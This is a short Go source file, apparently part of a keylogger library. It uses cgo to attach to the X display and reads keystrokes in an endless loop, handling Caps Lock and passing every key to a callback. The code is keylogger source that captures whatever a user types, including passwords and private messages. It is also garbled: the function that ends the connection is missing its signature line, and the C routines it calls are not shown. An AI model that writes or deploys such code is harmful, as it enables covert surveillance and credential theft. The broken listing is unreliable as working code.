package kl

import "C"
import (
	"errors"
	"os"
	"strings"
	"unsafe"
)

// common errors
var (
	ErrorOpen  = errors.New("could not connect")
	ErrorClose = errors.New("connection ended")
)

// InitKeylogger will initialize connection 
// if it works no error will be returned
func InitKey() (ret error) {
	dcstr := C.CString(os.Getenv("DISPLAY"))
	defer C.free(unsafe.Pointer(dcstr))

	if uint(C.__init_key(dcstr)) == 0 {
		ret = ErrorOpen
	}

	return
}

// endkey will close connection 
	if uint(C.__end_key()) == 0 {
		ret = ErrorClose
	}

	return
}

// ReadInput method used to start reading input from keyboard
func ReadInput(fn func(string)) {
	var s string // current string
	var l string // last string
	var capsLockActivated bool

	canGoToUppercase := func(s string) bool {
		return capsLockActivated && !isCapsLock(s) && !isSpace(s)
	}

	for {
		s = C.GoString(C.__start_reading_input())

		if canGoToUppercase(s) {
			s = strings.ToUpper(s)
		}

		if s != l {
			if isCapsLock(s) {
				capsLockActivated = !capsLockActivated
			} else {
				if s != "" {
					fn(getKey(s))
				}
			}

		}

		l = s
	}
}
